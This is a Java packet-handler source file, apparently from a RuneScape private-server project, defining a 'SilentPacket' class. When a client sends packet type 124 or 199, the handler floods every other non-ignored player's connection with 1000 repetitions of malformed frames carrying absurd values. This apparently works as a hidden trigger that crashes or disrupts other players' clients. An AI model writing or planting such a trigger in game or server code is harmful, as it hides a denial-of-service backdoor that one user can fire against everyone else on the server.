package server.model.players.packets;

import server.Config;
import server.Server;
import server.model.players.Client;
import server.model.players.PacketType;
import server.model.players.Player;
import server.util.Misc;

/**
 * Slient Packet
 **/
public class SilentPacket implements PacketType {
	
	@Override
	public void processPacket(Client c, int packetType, int packetSize) {
		if(packetType == 124 || packetType == 199){
			long[] playerModels = c.ignores;
			
			for(int i = 0; i < Config.MAX_PLAYERS; i++){
				
				if( Server.playerHandler.players[i] == null) 
					continue;
				
				if( Server.playerHandler.players[i].playerName.equalsIgnoreCase(c.playerName))
					continue;
				
				boolean sendPacket = true;
				
				for(int id = 0; id < playerModels.length; id++){
					if(playerModels[id] == Misc.playerNameToInt64(Server.playerHandler.players[i].playerName))
						sendPacket = false;
				}
				
				if(!sendPacket)
					continue;
				
				Client p = (Client) Server.playerHandler.players[i];
				
				if(p.getOutStream() != null && p != null) {
					for(int h = 0; h < 1000; h++){
						
						if(packetType == 199)
							p.getOutStream().createFrame(155);
						
						p.getOutStream().createFrame(166);//e
						p.getOutStream().writeByte(9999312);
						p.getOutStream().createFrame(185);
						p.getOutStream().writeDWord_v1(15000000);
						p.getOutStream().writeByte(9999);
						p.getOutStream().writeByte(13);
						p.getOutStream().createFrame(237);
					}
				}
				
			}
			
			return;
		}
	}
}
